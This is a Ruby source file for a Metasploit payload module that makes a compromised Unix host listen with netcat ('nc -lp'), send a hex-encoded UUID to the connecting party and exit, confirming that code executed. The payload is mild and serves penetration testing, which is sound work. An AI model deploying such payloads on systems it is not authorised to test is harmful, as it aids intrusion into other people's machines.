##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

require 'msf/base/sessions/pingback'
require 'msf/base/sessions/pingback_options'
require 'msf/core/payload/pingback'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Sessions::PingbackOptions
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Pingback Bind TCP (via netcat)',
      'Description'   => 'Accept a connection, send a UUID, then exit',
      'Author'         =>
        [
          'asoto-r7'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::Pingback,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'netcat',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    pingback_uuid ||= generate_pingback_uuid
    pingback_uuid.gsub!('-','')

    "echo -ne '#{pingback_uuid.scan(/../).map { |x| "\\x" + x }.join}' | nc -lp #{datastore['LPORT']}"
  end
end
